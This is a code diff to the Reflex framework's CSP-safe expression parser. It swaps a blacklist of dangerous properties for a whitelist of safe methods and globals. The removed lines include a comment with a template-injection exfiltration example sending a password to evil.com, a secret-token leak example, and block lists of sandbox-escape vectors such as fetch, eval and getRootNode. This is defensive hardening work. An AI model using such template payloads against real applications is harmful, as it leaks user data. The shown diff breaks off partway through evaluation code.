@@ -5,6 +5,14 @@
  * `new Function()` or `eval()`, making it compliant with strict
  * Content Security Policy (CSP) environments.
  *
+ * SECURITY MODEL: White-List Only
+ *
+ * This parser implements strict white-list security:
+ * 1. ALLOWS: Own data properties (via hasOwnProperty)
+ * 2. ALLOWS: Safe standard methods (from SAFE_METHODS whitelist)
+ * 3. ALLOWS: Safe globals (Math, Date, Array, etc. from SAFE_GLOBALS)
+ * 4. DENIES: Everything else (prototype chain, dangerous properties)
+ *
  * This module is NOT bundled with the core Reflex library to reduce
  * bundle size. Only load this if you need CSP-safe mode.
  *
@@ -26,13 +34,16 @@ import {
 // Symbol for identifying ScopeContainer instances
 const SCOPE_CONTAINER_MARKER = Symbol.for('reflex.ScopeContainer');
 
-// Dangerous property names that must be blocked to prevent prototype pollution
-// CRITICAL: __proto__ cannot be set via object literal syntax as it's treated as prototype setter
-// We must use Object.defineProperty or direct assignment after creation
-const DANGEROUS_PROPS: { [key: string]: boolean } = Object.create(null);
-DANGEROUS_PROPS['__proto__'] = true;
-DANGEROUS_PROPS['constructor'] = true;
-DANGEROUS_PROPS['prototype'] = true;
+// Prototype-related properties that should be blocked when setting in ScopeContainer
+// NOTE: Cannot use object literal with __proto__ - it's special syntax, not a property
+const SCOPE_PROTO_PROPS: { [key: string]: 1 } = Object.create(null);
+SCOPE_PROTO_PROPS['constructor'] = 1;
+SCOPE_PROTO_PROPS['__proto__'] = 1;
+SCOPE_PROTO_PROPS['prototype'] = 1;
+
+const isScopeProtoProperty = (k: string): boolean => {
+  return SCOPE_PROTO_PROPS[k] === 1;
+};
 
 /**
  * ScopeContainer - Secure scope storage that prevents prototype pollution
@@ -45,9 +56,6 @@ DANGEROUS_PROPS['prototype'] = true;
  * The returned object is a Proxy that intercepts property access,
  * allowing it to work with JavaScript's `with` statement while still
  * providing security guarantees.
- *
- * BREAKING CHANGE: Regular objects are no longer allowed as scopes.
- * All code must use ScopeContainer instances.
  */
 export interface ScopeContainerAPI {
   /** Check if a name exists in this scope or any parent scope */
@@ -75,7 +83,7 @@ export type ScopeContainerInstance = ScopeContainerAPI & { [key: string]: any };
  * The returned object is a Proxy that:
  * - Intercepts property gets/sets and delegates to internal Map
  * - Looks up parent scope for missing properties
- * - Blocks dangerous properties like __proto__, constructor, prototype
+ * - Uses WHITE-LIST ONLY approach - only serves from internal Map
  * - Works with JavaScript's `with` statement for expression evaluation
  */
 export class ScopeContainer {
@@ -97,11 +105,6 @@ export class ScopeContainer {
           return undefined;
         }
 
-        // Block dangerous properties
-        if (DANGEROUS_PROPS[prop]) {
-          return undefined;
-        }
-
         // API methods
         if (prop === 'has') return target.has.bind(target);
         if (prop === 'get') return target.get.bind(target);
@@ -110,7 +113,8 @@ export class ScopeContainer {
         if (prop === 'keys') return target.keys.bind(target);
         if (prop === 'getParent') return target.getParent.bind(target);
 
-        // Property lookup - check own data first, then parent chain
+        // WHITE-LIST ONLY: Property lookup - check own data first, then parent chain
+        // No prototype chain traversal, no dangerous property access
         if (target._data.has(prop)) {
           return target._data.get(prop);
         }
@@ -118,20 +122,20 @@ export class ScopeContainer {
           // Parent is also a Proxy, so direct property access works
           return (target._parent as any)[prop];
         }
+
+        // DENY: Everything not in internal data
         return undefined;
       },
 
       set(target, prop, value, receiver) {
         if (typeof prop === 'symbol') return false;
 
-        // Block dangerous properties
-        if (DANGEROUS_PROPS[prop]) {
-          throw new Error(
-            `Reflex Security: Cannot set dangerous property "${prop}" in scope.\n` +
-            `This property is blocked to prevent prototype pollution.`
-          );
+        // SECURITY: Block setting prototype-related properties
+        if (isScopeProtoProperty(prop)) {
+          throw new Error(`Cannot set dangerous property '${prop}' - prototype pollution attack blocked`);
         }
 
+        // Store in internal Map (safe - no prototype pollution possible)
         target._data.set(prop, value);
         return true;
       },
@@ -141,11 +145,6 @@ export class ScopeContainer {
           return prop === SCOPE_CONTAINER_MARKER;
         }
 
-        // Block dangerous properties
-        if (DANGEROUS_PROPS[prop]) {
-          return false;
-        }
-
         if (target._data.has(prop)) return true;
         if (target._parent) return prop in target._parent;
         return false;
@@ -153,7 +152,6 @@ export class ScopeContainer {
 
       deleteProperty(target, prop) {
         if (typeof prop === 'symbol') return false;
-        if (DANGEROUS_PROPS[prop]) return false;
         return target._data.delete(prop);
       },
 
@@ -163,7 +161,6 @@ export class ScopeContainer {
 
       getOwnPropertyDescriptor(target, prop) {
         if (typeof prop === 'symbol') return undefined;
-        if (DANGEROUS_PROPS[prop]) return undefined;
         if (target._data.has(prop)) {
           return {
             value: target._data.get(prop),
@@ -175,26 +172,20 @@ export class ScopeContainer {
         return undefined;
       },
 
-      // CRITICAL: Block __proto__ modification via setPrototypeOf
-      // __proto__ assignment may bypass the set trap in some engines
+      // Block prototype manipulation
       setPrototypeOf(target, proto) {
         throw new Error(
-          'Reflex Security: Cannot change prototype of ScopeContainer.\n' +
-          'This operation is blocked to prevent prototype pollution.'
+          'Reflex Security: Cannot change prototype of ScopeContainer.'
         );
       },
 
-      // Also need to define __proto__ as a non-writable property
-      // to prevent some __proto__ bypass techniques
       defineProperty(target, prop, descriptor) {
         if (typeof prop === 'symbol') return false;
-        if (DANGEROUS_PROPS[prop]) {
-          throw new Error(
-            `Reflex Security: Cannot define dangerous property "${prop}" in scope.\n` +
-            `This property is blocked to prevent prototype pollution.`
-          );
+        // SECURITY: Block defining prototype-related properties
+        if (isScopeProtoProperty(prop)) {
+          throw new Error(`Cannot define dangerous property '${prop}' - prototype pollution attack blocked`);
         }
-        // For regular properties, just store in the Map
+        // Store in internal Map
         if ('value' in descriptor) {
           target._data.set(prop, descriptor.value);
         }
@@ -225,12 +216,9 @@ export class ScopeContainer {
    * Set a value in this scope (never writes to parent)
    */
   set(name: string, value: any): void {
-    // Block dangerous property names
-    if (DANGEROUS_PROPS[name]) {
-      throw new Error(
-        `Reflex Security: Cannot set dangerous property "${name}" in scope.\n` +
-        `This property is blocked to prevent prototype pollution.`
-      );
+    // SECURITY: Block setting prototype-related properties
+    if (isScopeProtoProperty(name)) {
+      throw new Error(`Cannot set dangerous property '${name}' - prototype pollution attack blocked`);
     }
     this._data.set(name, value);
   }
@@ -267,17 +255,15 @@ export class ScopeContainer {
 
   /**
    * Create a ScopeContainer from a plain object (migration helper)
-   * This allows one-time conversion of legacy objects.
-   *
-   * WARNING: This is for migration only. New code should create
-   * ScopeContainer instances directly.
    */
   static fromObject(obj: Record<string, any>, parent: ScopeContainerInstance | null = null): ScopeContainerInstance {
     const container = new ScopeContainer(parent) as ScopeContainerInstance;
     for (const key of Object.keys(obj)) {
-      // Skip dangerous keys during migration
-      if (DANGEROUS_PROPS[key]) {
-        console.warn(`Reflex Security: Skipping dangerous key "${key}" during scope migration`);
+      // SECURITY: Skip dangerous properties with dev warning
+      if (isScopeProtoProperty(key)) {
+        if (typeof process !== 'undefined' && process.env?.NODE_ENV !== 'production') {
+          console.warn(`Reflex Security: Skipping dangerous property '${key}' in ScopeContainer.fromObject()`);
+        }
         continue;
       }
       container.set(key, obj[key]);
@@ -286,34 +272,13 @@ export class ScopeContainer {
   }
 }
 
-// Safe globals accessible in expressions
-// Note: Object is wrapped via SAFE_OBJECT to restrict dangerous methods
-const SAFE_GLOBALS = {
+// Safe globals accessible in expressions (WHITE-LIST)
+const SAFE_GLOBALS: { [key: string]: any } = {
   __proto__: null,
   Math, Date, Array, Number, String, Boolean, JSON,
   parseInt, parseFloat, isNaN, isFinite, NaN, Infinity,
   true: true, false: false, null: null, undefined: undefined
 };
-
-// Dangerous Object methods that could modify prototypes or global state
-const UNSAFE_OBJECT_METHODS = Object.assign(Object.create(null), {
-  defineProperty: 1,
-  defineProperties: 1,
-  create: 1,
-  assign: 1,
-  setPrototypeOf: 1,
-  getOwnPropertyDescriptor: 1,
-  getOwnPropertyDescriptors: 1,
-  getOwnPropertyNames: 1,
-  getOwnPropertySymbols: 1,
-  getPrototypeOf: 1,
-  preventExtensions: 1,
-  seal: 1,
-  freeze: 1,
-  isExtensible: 1,
-  isSealed: 1,
-  isFrozen: 1
-});
 
 // Create a safe Object wrapper that only exposes safe methods
 const SAFE_OBJECT = {
@@ -321,175 +286,52 @@ const SAFE_OBJECT = {
   values: Object.values,
   entries: Object.entries,
   fromEntries: Object.fromEntries,
-  hasOwn: Object.hasOwn || ((obj, prop) => Object.prototype.hasOwnProperty.call(obj, prop)),
+  hasOwn: Object.hasOwn || ((obj: any, prop: string) => Object.prototype.hasOwnProperty.call(obj, prop)),
   is: Object.is
 };
 
 // Add safe Object to SAFE_GLOBALS
 SAFE_GLOBALS['Object'] = SAFE_OBJECT;
 
-// CRITICAL SECURITY WARNING: Blacklist Approach Fragility
-// This blacklist-based approach has inherent weaknesses:
-// 1. New dangerous properties added to JavaScript (e.g., future TC39 proposals) won't be blocked
-// 2. Browser extensions and polyfills can add non-standard dangerous accessors
-// 3. Legacy browsers may have additional dangerous properties not listed here
-//
-// RECOMMENDATION: For maximum security, consider:
-// - Implementing a whitelist of known-safe properties
-// - Using a more restrictive CSP that blocks all dynamic code execution
-// - Regularly auditing and updating this blacklist
-// - Running templates in isolated contexts (Workers, sandboxed iframes)
-//
-// Dangerous property names that could lead to prototype pollution or app state leaks
-const UNSAFE_PROPS = Object.assign(Object.create(null), {
-  constructor: 1, prototype: 1, __defineGetter__: 1, __defineSetter__: 1,
-  __lookupGetter__: 1, __lookupSetter__: 1,
-  // CRITICAL SECURITY FIX: Block access to __rfx_app to prevent app state leak
-  // Without this, templates can access the entire internal state via {{ $el.__rfx_app.s.secretToken }}
-  __rfx_app: 1,
-  // CRITICAL SECURITY FIX: Block DOM properties that provide access to window/document/fetch
-  // These properties allow data exfiltration via network requests
-  // Exploit: {{ $el.ownerDocument.defaultView.fetch('https://evil.com?data=' + password) }}
-  ownerDocument: 1,
-  defaultView: 1,
-  contentWindow: 1,
-  contentDocument: 1,
-  // Block direct access to I/O APIs if exposed through objects
-  fetch: 1,
-  XMLHttpRequest: 1,
-  WebSocket: 1,
-  navigator: 1,
-  location: 1,
-  // Block access to global scope
-  window: 1,
-  document: 1,
-  globalThis: 1,
-  self: 1,
-  top: 1,
-  parent: 1,
-  frames: 1,
-  // CRITICAL FIX #9: Expanded blacklist for additional attack vectors
-  // Add properties that might be added by polyfills or browser extensions
-  eval: 1,
-  Function: 1,
-  Worker: 1,
-  SharedWorker: 1,
-  ServiceWorker: 1,
-  importScripts: 1,
-  postMessage: 1,
-  // Reflect and Proxy can be used to bypass protections
-  Reflect: 1,
-  Proxy: 1
-});
-UNSAFE_PROPS['__proto__'] = 1;
-
-/**
- * CRITICAL FIX #9: Runtime property safety validation
- * Check if a property name matches patterns known to be dangerous
- * This provides defense-in-depth against properties not in the blacklist
- *
- * CRITICAL FIX: Use exact matching instead of substring matching to avoid false positives
- * Substring matching blocks legitimate properties like "important", "evaluation", "prototype_id"
- * Now we only block exact matches to the dangerous property names
- */
-function isDangerousPropertyPattern(prop: string): boolean {
-  if (typeof prop !== 'string') return false;
-
-  // Properties starting with __ are often internal/dangerous
-  if (prop.startsWith('__')) return true;
-
-  // CRITICAL FIX: Use exact word matching with word boundaries instead of substring includes
-  // This prevents false positives while still catching dangerous patterns
-  // Only block if the dangerous word appears as a complete word (with word boundaries)
-  const dangerousWords = [
-    'constructor', 'proto', 'eval', 'function',
-    'import', 'require', 'process', 'global'
-  ];
-
-  const lowerProp = prop.toLowerCase();
-
-  // Check for exact matches first (most common case)
-  if (dangerousWords.includes(lowerProp)) return true;
-
-  // CRITICAL FIX #4: Check for word boundaries to avoid false positives
-  // Previous bug: Used [^a-z] which treated underscores as word boundaries
-  // This caused false positives for legitimate properties like constructor_id, proto_config
-  //
-  // TASK 12.6: Enforce Unicode-aware identifiers
-  // Use Unicode Property Escapes \p{ID_Continue} to properly identify identifier characters
-  // This ensures international variable names (e.g., varÀ, 変数, μεταβλητή) are treated correctly
-  //
-  // Examples that SHOULD match (dangerous):
-  //   - constructor (exact match)
-  //   - _constructor (non-alphanumeric before)
-  //   - constructor_ (non-alphanumeric after)
-  //   - proto.chain (non-alphanumeric after)
-  //
-  // Examples that SHOULD NOT match (safe):
-  //   - constructor_id (underscore is part of identifier)
-  //   - proto_config (underscore is part of identifier)
-  //   - important (dangerous word is substring)
-  //   - evaluation (dangerous word is substring)
-  //   - constructorÀ (À is part of identifier - Unicode continuation char)
-  //   - constructorFoo (Foo continues the identifier)
-  for (const dangerous of dangerousWords) {
-    // TASK 12.6 + 13.7: Create a regex that matches the dangerous word with Unicode-aware word boundaries
-    // Use [^\p{ID_Continue}$\u200c\u200d] to match non-identifier characters (Unicode-aware)
-    // This ensures characters like À, 日, μ are treated as part of the identifier
-    //
-    // TASK 13.7: Explicitly include Zero-Width Joiners (ZWJ/ZWNJ) as identifier characters
-    // U+200C (ZWNJ) and U+200D (ZWJ) are used in some scripts (Arabic, Indic) to control
-    // character joining. They MUST be treated as part of the identifier, not as word boundaries.
-    // Without this, an attacker could use "construc\u200Dtor" to bypass the "constructor" check.
-    //
-    // Match if: start of string OR non-identifier-char before, dangerous word, end of string OR non-identifier-char after
-    const pattern = new RegExp(`(^|[^\\p{ID_Continue}$\\u200c\\u200d])${dangerous}([^\\p{ID_Continue}$\\u200c\\u200d]|$)`, 'iu');
-    if (pattern.test(lowerProp)) return true;
-  }
-
-  return false;
-}
-
-// Dangerous method names that should be blocked on any object
-const UNSAFE_METHODS = Object.assign(Object.create(null), {
-  ...UNSAFE_OBJECT_METHODS,
-  // Additional dangerous methods that could be used for sandbox escape
-  eval: 1,
-  Function: 1,
-  // CRITICAL FIX #9: CSP Bypass via Method Borrowing
-  // call/apply/bind allow changing the 'this' context, which can be used to
-  // invoke methods on objects that were intended to be isolated
-  // Example: safeObj.method.apply(unsafeObj, args) bypasses isolation
-  call: 1,
-  apply: 1,
-  bind: 1,
-  // CRITICAL FIX: Sandbox Escape via getRootNode()
-  // getRootNode() provides access to the document root which can lead to window access
-  // Example: $el.getRootNode() returns the document, which has defaultView (window)
-  // This bypasses all sandbox restrictions and allows full DOM/window access
-  getRootNode: 1,
-  // CRITICAL SECURITY FIX: Expand denylist to prevent additional attack vectors
-  // String.prototype methods that generate HTML (XSS vectors)
-  link: 1,          // String.prototype.link() - generates <a> tag
-  anchor: 1,        // String.prototype.anchor() - generates <a> with name attribute
-  big: 1,           // String.prototype.big() - generates <big> tag
-  blink: 1,         // String.prototype.blink() - generates <blink> tag
-  bold: 1,          // String.prototype.bold() - generates <b> tag
-  fixed: 1,         // String.prototype.fixed() - generates <tt> tag
-  fontcolor: 1,     // String.prototype.fontcolor() - generates <font> tag
-  fontsize: 1,      // String.prototype.fontsize() - generates <font> tag
-  italics: 1,       // String.prototype.italics() - generates <i> tag
-  small: 1,         // String.prototype.small() - generates <small> tag
-  strike: 1,        // String.prototype.strike() - generates <strike> tag
-  sub: 1,           // String.prototype.sub() - generates <sub> tag
-  sup: 1,           // String.prototype.sup() - generates <sup> tag
-  // Code execution methods
-  setTimeout: 1,
-  setInterval: 1,
-  setImmediate: 1
-  // NOTE: valueOf and toString are NOT blocked as they're needed for normal operations
-  // The membrane system provides the primary defense against malicious overrides
-});
+// Safe methods whitelist for objects (same as in symbols.ts)
+const SAFE_METHODS: { [key: string]: 1 } = {
+  __proto__: null,
+  // Array methods
+  map: 1, filter: 1, reduce: 1, reduceRight: 1, forEach: 1, find: 1, findIndex: 1,
+  findLast: 1, findLastIndex: 1, some: 1, every: 1, indexOf: 1, lastIndexOf: 1,
+  includes: 1, slice: 1, concat: 1, join: 1, flat: 1, flatMap: 1, at: 1,
+  toReversed: 1, toSorted: 1, toSpliced: 1, with: 1,
+  push: 1, pop: 1, shift: 1, unshift: 1, splice: 1, sort: 1, reverse: 1, fill: 1, copyWithin: 1,
+  // String methods
+  charAt: 1, charCodeAt: 1, codePointAt: 1, substring: 1, substr: 1,
+  toLowerCase: 1, toUpperCase: 1, toLocaleLowerCase: 1, toLocaleUpperCase: 1,
+  trim: 1, trimStart: 1, trimEnd: 1, trimLeft: 1, trimRight: 1,
+  split: 1, replace: 1, replaceAll: 1, match: 1, matchAll: 1,
+  search: 1, startsWith: 1, endsWith: 1, padStart: 1, padEnd: 1, repeat: 1,
+  normalize: 1, localeCompare: 1,
+  // Object methods (safe subset)
+  toString: 1, valueOf: 1, hasOwnProperty: 1, toLocaleString: 1,
+  // Number methods
+  toFixed: 1, toPrecision: 1, toExponential: 1,
+  // Date methods
+  getTime: 1, getFullYear: 1, getMonth: 1, getDate: 1, getDay: 1,
+  getHours: 1, getMinutes: 1, getSeconds: 1, getMilliseconds: 1,
+  getUTCFullYear: 1, getUTCMonth: 1, getUTCDate: 1, getUTCDay: 1,
+  getUTCHours: 1, getUTCMinutes: 1, getUTCSeconds: 1, getUTCMilliseconds: 1,
+  getTimezoneOffset: 1, toISOString: 1, toJSON: 1,
+  toLocaleDateString: 1, toLocaleTimeString: 1,
+  toDateString: 1, toTimeString: 1, toUTCString: 1,
+  setTime: 1, setFullYear: 1, setMonth: 1, setDate: 1,
+  setHours: 1, setMinutes: 1, setSeconds: 1, setMilliseconds: 1,
+  setUTCFullYear: 1, setUTCMonth: 1, setUTCDate: 1,
+  setUTCHours: 1, setUTCMinutes: 1, setUTCSeconds: 1, setUTCMilliseconds: 1,
+  // Map/Set methods
+  keys: 1, values: 1, entries: 1, get: 1, has: 1, set: 1, add: 1, delete: 1, clear: 1, size: 1,
+  // RegExp methods
+  test: 1, exec: 1,
+  // Length property
+  length: 1
+} as any;
 
 /**
  * CSP-Safe Expression Parser
@@ -507,8 +349,6 @@ const UNSAFE_METHODS = Object.assign(Object.create(null), {
  * - Magic properties: $event, $el, $refs, $dispatch, $nextTick
  */
 // CRITICAL SECURITY: Maximum recursion depth to prevent stack overflow DoS
-// A malicious expression like ((((...(((1)))...))) with 10k nested parens
-// will crash the parser without this limit
 const MAX_RECURSION_DEPTH = 50;
 
 export class SafeExprParser {
@@ -529,14 +369,13 @@ export class SafeExprParser {
    * @param {Reflex} reflex - Reflex instance (for _tk, _mf, _refs, etc.)
    * @returns {Function} Evaluator (state, context, $event, $el) => result
    */
-  compile(exp, reflex) {
+  compile(exp: string, reflex: any) {
     const ast = this.parse(exp);
-    return (state, context, $event, $el) => {
+    return (state: any, context: any, $event: any, $el: any) => {
       try {
         return this._evaluate(ast, state, context, $event, $el, reflex);
-      } catch (err) {
+      } catch (err: any) {
         // CRITICAL SECURITY: Rethrow security violations instead of swallowing them
-        // Security errors must crash the app to prevent attacks
         if (err instanceof TypeError && err.message && err.message.includes('Reflex Security:')) {
           throw err;
         }
@@ -549,20 +388,18 @@ export class SafeExprParser {
   /**
    * Parse an expression into an AST.
    */
-  parse(expr) {
+  parse(expr: string) {
     this.expr = expr.trim();
     this.pos = 0;
     this.depth = 0;
     return this.parseExpression();
   }
 
-  parseExpression() {
-    // CRITICAL SECURITY FIX: Prevent stack overflow DoS via deeply nested expressions
-    // Without this check, {{ ((((...(((1)))...))) }} with 10k parens crashes the parser
+  parseExpression(): any {
+    // CRITICAL SECURITY: Prevent stack overflow DoS via deeply nested expressions
     if (++this.depth > MAX_RECURSION_DEPTH) {
       throw new Error(
-        `Reflex Security: Expression exceeds maximum nesting depth (${MAX_RECURSION_DEPTH}). ` +
-        `This could be a denial-of-service attack. Simplify your expression.`
+        `Reflex Security: Expression exceeds maximum nesting depth (${MAX_RECURSION_DEPTH}).`
       );
     }
     try {
@@ -572,7 +409,7 @@ export class SafeExprParser {
     }
   }
 
-  parseTernary() {
+  parseTernary(): any {
     const condition = this.parseOr();
     this.skipWhitespace();
     if (this.peek() === '?') {
@@ -589,7 +426,7 @@ export class SafeExprParser {
     return condition;
   }
 
-  parseOr() {
+  parseOr(): any {
     let left = this.parseAnd();
     while (this.matchStr('||')) {
       left = { type: 'binary', op: '||', left, right: this.parseAnd() };
@@ -597,7 +434,7 @@ export class SafeExprParser {
     return left;
   }
 
-  parseAnd() {
+  parseAnd(): any {
     let left = this.parseNullishCoalescing();
     while (this.matchStr('&&')) {
       left = { type: 'binary', op: '&&', left, right: this.parseNullishCoalescing() };
@@ -605,7 +442,7 @@ export class SafeExprParser {
     return left;
   }
 
-  parseNullishCoalescing() {
+  parseNullishCoalescing(): any {
     let left = this.parseEquality();
     while (this.matchStr('??')) {
       left = { type: 'binary', op: '??', left, right: this.parseEquality() };
@@ -613,7 +450,7 @@ export class SafeExprParser {
     return left;
   }
 
-  parseEquality() {
+  parseEquality(): any {
     let left = this.parseRelational();
     while (true) {
       this.skipWhitespace();
@@ -626,11 +463,10 @@ export class SafeExprParser {
     return left;
   }
 
-  parseRelational() {
+  parseRelational(): any {
     let left = this.parseComparison();
     while (true) {
       this.skipWhitespace();
-      // Check for 'in' operator (must be followed by whitespace or special char to avoid matching 'indexOf')
       if (this.matchStr('in ') || (this.matchStr('in') && (this.peek() === '(' || this.peek() === '[' || this.peek() === '{' || !this.isIdentPart(this.peek())))) {
         left = { type: 'binary', op: 'in', left, right: this.parseComparison() };
       } else break;
@@ -638,7 +474,7 @@ export class SafeExprParser {
     return left;
   }
 
-  parseComparison() {
+  parseComparison(): any {
     let left = this.parseAdditive();
     while (true) {
       this.skipWhitespace();
@@ -655,7 +491,7 @@ export class SafeExprParser {
     return left;
   }
 
-  parseAdditive() {
+  parseAdditive(): any {
     let left = this.parseMultiplicative();
     while (true) {
       this.skipWhitespace();
@@ -670,7 +506,7 @@ export class SafeExprParser {
     return left;
   }
 
-  parseMultiplicative() {
+  parseMultiplicative(): any {
     let left = this.parseUnary();
     while (true) {
       this.skipWhitespace();
@@ -688,7 +524,7 @@ export class SafeExprParser {
     return left;
   }
 
-  parseUnary() {
+  parseUnary(): any {
     this.skipWhitespace();
     if (this.peek() === '!') {
       this.pos++;
@@ -698,10 +534,6 @@ export class SafeExprParser {
       this.pos++;
       return { type: 'unary', op: '-', arg: this.parseUnary() };
     }
-    // CRITICAL FIX: Missing Unary Plus Operator
-    // The unary plus (+value) is the standard, idiomatic way to coerce strings to numbers
-    // in JavaScript templates. Without this, templates using +inputValue throw a syntax error
-    // in Safe Mode, forcing developers to use verbose Number() calls.
     if (this.peek() === '+' && !this.isDigit(this.expr[this.pos + 1])) {
       this.pos++;
       return { type: 'unary', op: '+', arg: this.parseUnary() };
@@ -712,7 +544,7 @@ export class SafeExprParser {
     return this.parsePostfix();
   }
 
-  parsePostfix() {
+  parsePostfix(): any {
     let obj = this.parsePrimary();
     while (true) {
       this.skipWhitespace();
@@ -740,8 +572,8 @@ export class SafeExprParser {
     return obj;
   }
 
-  parseArguments() {
-    const args = [];
+  parseArguments(): any[] {
+    const args: any[] = [];
     this.skipWhitespace();
     if (this.peek() !== ')') {
       args.push(this.parseExpression());
@@ -755,7 +587,7 @@ export class SafeExprParser {
     return args;
   }
 
-  parsePrimary() {
+  parsePrimary(): any {
     this.skipWhitespace();
     const c = this.peek();
 
@@ -772,14 +604,14 @@ export class SafeExprParser {
     // Array literal
     if (c === '[') {
       this.pos++;
-      const elements = [];
+      const elements: any[] = [];
       this.skipWhitespace();
       if (this.peek() !== ']') {
         elements.push(this.parseExpression());
         while (this.peek() === ',') {
           this.pos++;
           this.skipWhitespace();
-          if (this.peek() === ']') break; // trailing comma
+          if (this.peek() === ']') break;
           elements.push(this.parseExpression());
         }
       }
@@ -791,7 +623,7 @@ export class SafeExprParser {
     // Object literal
     if (c === '{') {
       this.pos++;
-      const properties = [];
+      const properties: any[] = [];
       this.skipWhitespace();
       if (this.peek() !== '}') {
         properties.push(this.parseObjectProperty());
@@ -832,7 +664,7 @@ export class SafeExprParser {
     throw new Error('Unexpected token: ' + c);
   }
 
-  parseObjectProperty() {
+  parseObjectProperty(): any {
     this.skipWhitespace();
     let key;
     if (this.peek() === '"' || this.peek() === "'") {
@@ -861,7 +693,7 @@ export class SafeExprParser {
     return { computed: false, key, value: { type: 'identifier', name: key }, shorthand: true };
   }
 
-  parseString() {
+  parseString(): any {
     const quote = this.peek();
     this.pos++;
     let value = '';
@@ -886,7 +718,7 @@ export class SafeExprParser {
     return { type: 'literal', value };
   }
 
-  parseNumber() {
+  parseNumber(): any {
     let num = '';
     if (this.peek() === '-') { num += '-'; this.pos++; }
     while (this.isDigit(this.peek())) { num += this.peek(); this.pos++; }
@@ -902,20 +734,20 @@ export class SafeExprParser {
     return { type: 'literal', value: parseFloat(num) };
   }
 
-  parseIdentifier() {
+  parseIdentifier(): string | null {
     const start = this.pos;
     if (!this.isIdentStart(this.peek())) return null;
     while (this.isIdentPart(this.peek())) this.pos++;
     return this.expr.slice(start, this.pos);
   }
 
-  skipWhitespace() {
+  skipWhitespace(): void {
     while (this.pos < this.expr.length && /\s/.test(this.peek())) this.pos++;
   }
 
-  peek() { return this.expr[this.pos]; }
+  peek(): string { return this.expr[this.pos]; }
 
-  matchStr(s) {
+  matchStr(s: string): boolean {
     this.skipWhitespace();
     if (this.expr.slice(this.pos, this.pos + s.length) === s) {
       this.pos += s.length;
@@ -924,49 +756,28 @@ export class SafeExprParser {
     return false;
   }
 
-  isDigit(c) { return c >= '0' && c <= '9'; }
+  isDigit(c: string): boolean { return c >= '0' && c <= '9'; }
 
-  // CRITICAL FIX #8: Unicode Identifier Support
-  //
-  // PREVIOUS BUG: Strict ASCII-only regex /[a-zA-Z_$]/ rejected valid Unicode identifiers
-  // This broke applications using internationalized variable names (common in non-English teams)
-  // Example failures: accented characters (café), emojis (💡), non-Latin scripts (日本語)
-  //
-  // SOLUTION: Use Unicode property escapes to match ECMAScript identifier syntax
-  // - \p{ID_Start} matches all characters valid at the start of an identifier
-  // - \p{ID_Continue} matches all characters valid in the rest of an identifier
-  // - Includes Latin, Greek, Cyrillic, CJK, Arabic, Hebrew, Devanagari, and more
-  // - Also includes combining marks, digits, and connectors in ID_Continue
-  //
-  // PERFORMANCE NOTE: Unicode regex with 'u' flag is slightly slower than ASCII-only
-  // However, correctness and i18n support are more important than micro-optimization
-  isIdentStart(c) {
+  isIdentStart(c: string): boolean {
     if (!c) return false;
-    // Fast path for common ASCII identifiers (optimization)
     if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || c === '_' || c === '$') {
       return true;
     }
-    // Unicode path for international identifiers
-    // Use \p{ID_Start} for ECMAScript-compliant identifier start characters
     return /[\p{ID_Start}$_]/u.test(c);
   }
 
-  isIdentPart(c) {
+  isIdentPart(c: string): boolean {
     if (!c) return false;
-    // Fast path for common ASCII identifiers (optimization)
     if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c === '_' || c === '$') {
       return true;
     }
-    // Unicode path for international identifiers
-    // Use \p{ID_Continue} for ECMAScript-compliant identifier continuation characters
-    // Includes digits, combining marks (U+200C, U+200D), and all ID_Start characters
     return /[\p{ID_Continue}$\u200c\u200d]/u.test(c);
   }
 
   /**
-   * Evaluate an AST node.
+   * Evaluate an AST node using WHITE-LIST ONLY security model.
    */
-  _evaluate(node, state, context, $event, $el, reflex) {
+  _evaluate(node: any, state: any, context: any, $event: any, $el: any, reflex: any): any {
     if (!node) return undefined;
 
     switch (node.type) {
@@ -975,43 +786,29 @@ export class SafeExprParser {
 
       case 'identifier': {
         const name = node.name;
-        // CRITICAL FIX #9: Enhanced property validation with pattern matching
-        if (UNSAFE_PROPS[name] || isDangerousPropertyPattern(name)) {
-          console.warn('Reflex: Blocked access to unsafe property:', name);
-          return undefined;
-        }
+
         // Magic properties
         if (name === '$event') return $event;
-        // CRITICAL SECURITY FIX: Wrap $el in element membrane to prevent sandbox escape
-        // Without this, {{ $el.ownerDocument.defaultView.fetch(...) }} enables data exfiltration
         if (name === '$el') return createElementMembrane($el);
         if (name === '$refs') return reflex._refs;
         if (name === '$dispatch') return reflex._dispatch.bind(reflex);
         if (name === '$nextTick') return reflex.nextTick.bind(reflex);
 
-        // BREAKING CHANGE: Context must be FlatScope or ScopeContainer
-        // FlatScope is the new preferred format (uses flat Map storage)
-        // ScopeContainer is supported for backward compatibility
+        // Context Lookup (FlatScope or ScopeContainer)
         if (context) {
-          // Check for FlatScope first (new flat lookup)
           if (isFlatScope(context)) {
             const result = getFlatScopeValue(context, name);
             if (result.found) {
               const value = result.value;
-              // Track dependency if reactive
               if (value !== null && typeof value === 'object') {
                 const meta = value[META] || reflex._mf.get(value);
                 if (meta) reflex.trackDependency(meta, name);
               }
               return value;
             }
-            // Not found in flat scope - continue to state/global lookup
-            // This is INTENTIONAL - no parent chain traversal
           } else if (ScopeContainer.isScopeContainer(context)) {
-            // ScopeContainer path (backward compatibility)
             if (context.has(name)) {
               const value = context.get(name);
-              // Track dependency if reactive
               if (value !== null && typeof value === 'object') {
                 const meta = value[META] || reflex._mf.get(value);
                 if (meta) reflex.trackDependency(meta, name);
@@ -1020,25 +817,25 @@ export class SafeExprParser {
             }
           } else if (typeof context === 'object' && Object.keys(context).length === 0) {
             // Allow empty plain objects as equivalent to no context
-            // This provides backward compatibility for tests
-            // Fall through to state/global lookup
           } else {
-            // Neither FlatScope nor ScopeContainer - reject
             throw new TypeError(
-              `Reflex Security: Context must be a FlatScope or ScopeContainer instance.\n` +
-              `Received: ${typeof context} ${context?.constructor?.name || 'unknown'}\n\n` +
-              `BREAKING CHANGE: Regular objects are no longer allowed as scopes.\n` +
-              `Migration: Scopes are now created automatically by m-for.`
+              `Reflex Security: BREAKING CHANGE - Context must be a FlatScope or ScopeContainer instance. ` +
+              `Plain objects are no longer allowed for security reasons.`
             );
           }
         }
 
-        // State lookup
-        if (state && name in state) {
+        // State Lookup (Only Own Properties - WHITE-LIST approach)
+        if (state && Object.prototype.hasOwnProperty.call(state, name)) {
           return state[name];
         }
-        // Global lookup
